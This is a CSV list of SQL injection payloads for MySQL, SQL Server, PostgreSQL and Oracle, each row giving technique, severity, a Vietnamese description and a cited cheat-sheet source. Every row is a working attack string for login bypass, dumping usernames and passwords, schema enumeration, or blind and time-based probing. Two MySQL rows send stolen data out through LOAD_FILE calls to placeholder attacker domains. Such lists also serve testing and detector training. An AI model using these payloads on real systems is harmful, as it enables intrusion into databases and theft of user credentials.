payload,type,technique,dbms,severity,purpose,description,source
 OR 1=1 -- -,In-band,UNION-based,MySQL,Trung bình,Truy cập trái phép,Bypass đăng nhập bằng cách luôn tạo điều kiện TRUE,OWASP SQL Injection Prevention Cheat Sheet
"' UNION SELECT 1,2,3 -- -",In-band,UNION-based,MySQL,Trung bình,Truy cập trái phép,Xác định số cột trong bảng hiện tại,PortSwigger Web Security Academy
"' UNION SELECT username, password FROM users -- -",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Lấy tên đăng nhập và mật khẩu từ bảng users,OWASP Testing Guide v4
"' UNION SELECT table_name, column_name FROM information_schema.columns -- -",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Lấy thông tin về cấu trúc cơ sở dữ liệu,HackTricks SQL Injection Guide
"' UNION SELECT 1, @@version -- -",In-band,UNION-based,MySQL,Trung bình,Truy cập trái phép,Lấy thông tin phiên bản của MySQL,SQL Injection Cheat Sheet by Invicti
"' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) -- -",In-band,Error-based,MySQL,Cao,Truy cập trái phép,Sử dụng hàm EXTRACTVALUE để gây lỗi và hiển thị phiên bản DB,Pentestmonkey SQL Injection Cheat Sheet
"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -",In-band,Error-based,MySQL,Cao,Truy cập trái phép,Sử dụng lỗi GROUP BY để trích xuất thông tin,Netsparker SQL Injection Guide
"' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1) -- -",In-band,Error-based,MySQL,Cao,Truy cập trái phép,Sử dụng hàm UPDATEXML để gây lỗi và hiển thị user hiện tại,OWASP SQL Injection Testing Guide
' AND 1=1 -- -,Blind,Boolean-based,MySQL,Trung bình,Truy cập trái phép,Kiểm tra điều kiện boolean trả về TRUE,PortSwigger Web Security Academy
' AND 1=2 -- -,Blind,Boolean-based,MySQL,Trung bình,Truy cập trái phép,Kiểm tra điều kiện boolean trả về FALSE,PortSwigger Web Security Academy
"' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' -- -",Blind,Boolean-based,MySQL,Cao,Truy cập trái phép,Trích xuất ký tự đầu tiên của username,OWASP Testing Guide v4
"' AND ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=97 -- -",Blind,Boolean-based,MySQL,Cao,Truy cập trái phép,Kiểm tra mã ASCII của ký tự trong username,Pentestmonkey SQL Injection Cheat Sheet
' AND SLEEP(5) -- -,Blind,Time-based,MySQL,Cao,Truy cập trái phép,Gây trì hoãn 5 giây để xác định lỗ hổng,Pentestmonkey SQL Injection Cheat Sheet
"' AND IF(1=1, SLEEP(5), 0) -- -",Blind,Time-based,MySQL,Cao,Truy cập trái phép,Trì hoãn có điều kiện để xác nhận lỗ hổng,PortSwigger Web Security Academy
"' AND (SELECT IF(MID(version(),1,1)='5',SLEEP(5),0)) -- -",Blind,Time-based,MySQL,Cao,Truy cập trái phép,Xác định phiên bản MySQL bằng kỹ thuật time-based,HackTricks SQL Injection Guide
"' UNION SELECT LOAD_FILE(CONCAT('\\\\',user(),'.attackerdomain.com\\share\\file')) -- -",Out-of-band,UNION-based,MySQL,Cao,Truy cập trái phép,Cố gắng kết nối đến máy chủ ngoài để gửi dữ liệu đánh cắp,OWASP SQL Injection Testing Guide
"'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin'),'.malicious.com\\share\\')) -- -",Out-of-band,UNION-based,MySQL,Cao,Truy cập trái phép,Trích xuất mật khẩu và gửi đến máy chủ ngoài,Pentestmonkey SQL Injection Cheat Sheet
' OR 1=1 -- ,In-band,UNION-based,SQL Server,Trung bình,Truy cập trái phép,Bypass đăng nhập bằng cách luôn tạo điều kiện TRUE,OWASP SQL Injection Prevention Cheat Sheet
"' UNION SELECT 1,2,3 -- ",In-band,UNION-based,SQL Server,Trung bình,Truy cập trái phép,Xác định số cột trong bảng hiện tại,PortSwigger Web Security Academy
"' UNION SELECT username, password, 3 FROM users -- ",In-band,UNION-based,SQL Server,Cao,Truy cập trái phép,Lấy tên đăng nhập và mật khẩu từ bảng users,OWASP Testing Guide v4
"' UNION SELECT name, NULL, NULL FROM sysobjects WHERE xtype='U' -- ",In-band,UNION-based,SQL Server,Cao,Truy cập trái phép,Liệt kê tất cả các bảng người dùng trong SQL Server,Pentestmonkey SQL Injection Cheat Sheet
"' AND 1=CONVERT(int, (SELECT @@version)) -- ",In-band,Error-based,SQL Server,Cao,Truy cập trái phép,Gây lỗi chuyển đổi kiểu để hiển thị phiên bản SQL Server,Pentestmonkey SQL Server Injection Cheat Sheet
"' AND 1=CONVERT(int, user_name()) -- ",In-band,Error-based,SQL Server,Cao,Truy cập trái phép,Gây lỗi chuyển đổi kiểu để hiển thị tên người dùng hiện tại,HackTricks SQL Injection Guide
' AND (SELECT COUNT(*) FROM sysusers)>0 -- ,Blind,Boolean-based,SQL Server,Cao,Truy cập trái phép,Xác định số lượng người dùng trong hệ thống,PortSwigger Web Security Academy
' AND (SELECT COUNT(*) FROM sysobjects WHERE name LIKE 'user%')>0 -- ,Blind,Boolean-based,SQL Server,Cao,Truy cập trái phép,Xác định có bảng nào liên quan đến người dùng hay không,HackTricks SQL Injection Guide
' OR 1=1 --,In-band,UNION-based,PostgreSQL,Trung bình,Truy cập trái phép,Bypass đăng nhập bằng cách luôn tạo điều kiện TRUE,OWASP SQL Injection Prevention Cheat Sheet
"' UNION SELECT 1,2,3 --",In-band,UNION-based,PostgreSQL,Trung bình,Truy cập trái phép,Xác định số cột trong bảng hiện tại,PortSwigger Web Security Academy
"' UNION SELECT username, password, NULL FROM users --",In-band,UNION-based,PostgreSQL,Cao,Truy cập trái phép,Lấy tên đăng nhập và mật khẩu từ bảng users,OWASP Testing Guide v4
' AND 1=CAST((SELECT version()) AS INTEGER) --,In-band,Error-based,PostgreSQL,Cao,Truy cập trái phép,Gây lỗi chuyển đổi kiểu để hiển thị phiên bản PostgreSQL,Pentestmonkey PostgreSQL Injection Cheat Sheet
' AND 1=CAST((SELECT current_user) AS INTEGER) --,In-band,Error-based,PostgreSQL,Cao,Truy cập trái phép,Gây lỗi chuyển đổi kiểu để hiển thị người dùng hiện tại,HackTricks SQL Injection Guide
' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --,Blind,Boolean-based,PostgreSQL,Cao,Truy cập trái phép,Xác định số lượng bảng trong cơ sở dữ liệu,PortSwigger Web Security Academy
"' AND SUBSTR((SELECT version()),1,1)='P' --",Blind,Boolean-based,PostgreSQL,Cao,Truy cập trái phép,Xác định chữ cái đầu tiên của phiên bản PostgreSQL,HackTricks SQL Injection Guide
' AND (SELECT pg_sleep(5)) --,Blind,Time-based,PostgreSQL,Cao,Truy cập trái phép,Gây trì hoãn 5 giây để xác định lỗ hổng,Pentestmonkey PostgreSQL Injection Cheat Sheet
' AND CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users --,Blind,Time-based,PostgreSQL,Cao,Truy cập trái phép,Xác định sự tồn tại của người dùng admin bằng kỹ thuật time-based,PortSwigger Web Security Academy
' OR 1=1 --,In-band,UNION-based,Oracle,Trung bình,Truy cập trái phép,Bypass đăng nhập bằng cách luôn tạo điều kiện TRUE,OWASP SQL Injection Prevention Cheat Sheet
"' UNION SELECT NULL,NULL,NULL FROM dual --",In-band,UNION-based,Oracle,Trung bình,Truy cập trái phép,Xác định số cột trong bảng hiện tại,PortSwigger Web Security Academy
"' UNION SELECT username, password, NULL FROM all_users --",In-band,UNION-based,Oracle,Cao,Truy cập trái phép,Lấy tên đăng nhập và mật khẩu từ bảng all_users,OWASP Testing Guide v4
"' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) --",In-band,Error-based,Oracle,Cao,Truy cập trái phép,Sử dụng lỗi CTXSYS để hiển thị phiên bản Oracle,Pentestmonkey Oracle Injection Cheat Sheet
' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||USER||CHR(62))) FROM dual) --,In-band,Error-based,Oracle,Cao,Truy cập trái phép,Sử dụng lỗi XMLType để hiển thị người dùng hiện tại,HackTricks SQL Injection Guide
' AND (SELECT COUNT(*) FROM all_tables)>0 --,Blind,Boolean-based,Oracle,Cao,Truy cập trái phép,Xác định số lượng bảng trong cơ sở dữ liệu,PortSwigger Web Security Academy
"' AND SUBSTR((SELECT user FROM dual),1,1)='S' --",Blind,Boolean-based,Oracle,Cao,Truy cập trái phép,Xác định chữ cái đầu tiên của người dùng hiện tại,HackTricks SQL Injection Guide
